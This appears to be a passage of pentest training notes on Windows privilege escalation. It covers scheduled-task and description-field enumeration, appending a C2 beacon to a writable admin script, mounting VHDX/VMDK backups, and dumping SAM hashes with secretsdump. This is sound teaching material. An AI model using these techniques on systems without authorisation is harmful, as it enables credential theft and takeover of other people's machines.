This [link](https://web.archive.org/web/20210620053630/https://gist.github.com/gentilkiwi/802c221c0731c06c22bb75650e884e5a) lists all of the vulnerable Windows Server and Workstation versions.

>The steps above were done using the Chrome browser and may differ slightly in other browsers.
#### Scheduled Tasks

###### Enumerating Scheduled Tasks
We can use the [schtasks](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) command to enumerate scheduled tasks on the system.
```cmd
schtasks /query /fo LIST /v
```
**Enumerating Scheduled Tasks with PowerShell**
```powershell
Get-ScheduledTask | select TaskName,State
```
By default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in `C:\Windows\System32\Tasks`, which standard users do not have read access to. It is not uncommon for system administrators to go against security practices and perform actions such as provide read or write access to a folder usually reserved only for administrators. We (though rarely) may encounter a scheduled task that runs as an administrator configured with weak file/folder permissions for any number of reasons. In this case, we may be able to edit the task itself to perform an unintended action or modify a script run by the scheduled task.

###### Checking Permissions on C:\Scripts Directory
Consider a scenario where we are on the fourth day of a two-week penetration test engagement. We have gained access to a handful of systems so far as unprivileged users and have exhausted all options for privilege escalation. Just at this moment, we notice a writeable `C:\Scripts` directory that we overlooked in our initial enumeration.
```powershell
.\accesschk64.exe /accepteula -s -d C:\Scripts\
  #   RW BUILTIN\Users
```
We notice various scripts in this directory, such as `db-backup.ps1`, `mailbox-backup.ps1`, etc., which are also all writeable by the `BUILTIN\USERS` group. At this point, we can append a snippet of code to one of these files with the assumption that at least one of these runs on a daily, if not more frequent, basis. We write a command to send a beacon back to our C2 infrastructure and carry on with testing. The next morning when we log on, we notice a single beacon as `NT AUTHORITY\SYSTEM` on the DB01 host. We can now safely assume that one of the backup scripts ran overnight and ran our appended code in the process. This is an example of how important even the slightest bit of information we uncover during enumeration can be to the success of our engagement. Enumeration and post-exploitation during an assessment are iterative processes. Each time we perform the same task across different systems, we may be gaining more pieces of the puzzle that, when put together, will get us to our goal.
#### User/Computer Description Field
###### Checking Local User Description Field
Though more common in Active Directory, it is possible for a sysadmin to store account details (such as a password) in a computer or user's account description field. We can enumerate this quickly for local users using the [Get-LocalUser](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser?view=powershell-5.1) cmdlet.
```powershell
Get-LocalUser
```
###### Enumerating Computer Description Field with Get-WmiObject Cmdlet
We can also enumerate the computer description field via PowerShell using the [Get-WmiObject](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1) cmdlet with the [Win32_OperatingSystem](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-operatingsystem) class.
```powershell
PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description
```
#### Mount VHDX/VMDK
During our enumeration, we will often come across interesting files both locally and on network share drives. We may find passwords, SSH keys or other data that can be used to further our access. The tool [Snaffler](https://github.com/SnaffCon/Snaffler) can help us perform thorough enumeration that we could not otherwise perform by hand. The tool searches for many interesting file types, such as files containing the phrase "pass" in the file name, KeePass database files, SSH keys, web.config files, and many more.

Three specific file types of interest are `.vhd`, `.vhdx`, and `.vmdk` files. These are `Virtual Hard Disk`, `Virtual Hard Disk v2` (both used by Hyper-V), and `Virtual Machine Disk` (used by VMware). Let's assume that we land on a web server and have had no luck escalating privileges, so we resort to hunting through network shares. We come across a backups share hosting a variety of `.VMDK` and `.VHDX` files whose filenames match hostnames in the network. One of these files matches a host that we were unsuccessful in escalating privileges on, but it is key to our assessment because there is an Active Domain admin session. If we can escalate to SYSTEM, we can likely steal the user's NTLM password hash or Kerberos TGT ticket and take over the domain.

If we encounter any of these three files, we have options to mount them on either our local Linux or Windows attack boxes. If we can mount a share from our Linux attack box or copy over one of these files, we can mount them and explore the various operating system files and folders as if we were logged into them using the following commands.
###### Mount VMDK on Linux
```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```
###### Mount VHD/VHDX on Linux
```bash
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```
In Windows, we can right-click on the file and choose `Mount`, or use the `Disk Management` utility to mount a `.vhd` or `.vhdx` file. If preferred, we can use the [Mount-VHD](https://docs.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd?view=windowsserver2019-ps) PowerShell cmdlet. Regardless of the method, once we do this, the virtual hard disk will appear as a lettered drive that we can then browse.
![[Pasted image 20260121052437.png]]
For a `.vmdk` file, we can right-click and choose `Map Virtual Disk` from the menu. Next, we will be prompted to select a drive letter. If all goes to plan, we can browse the target operating system's files and directories. If this fails, we can use VMWare Workstation `File --> Map Virtual Disks` to map the disk onto our base system. We could also add the `.vmdk` file onto our attack VM as an additional virtual hard drive, then access it as a lettered drive. We can even use `7-Zip` to extract data from a .`vmdk` file. This [guide](https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/) illustrates many methods for gaining access to the files on a `.vmdk` file.
###### Retrieving Hashes using Secretsdump.py
Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the `C:\Windows\System32\Config` directory and pull down the `SAM`, `SECURITY` and `SYSTEM` registry hives. We can then use a tool such as [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) to extract the password hashes for local users.
```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```
We may get lucky and retrieve the local administrator password hash for the target system or find an old local administrator password hash that works on other systems in the environment (both of which I have done on quite a few assessments).
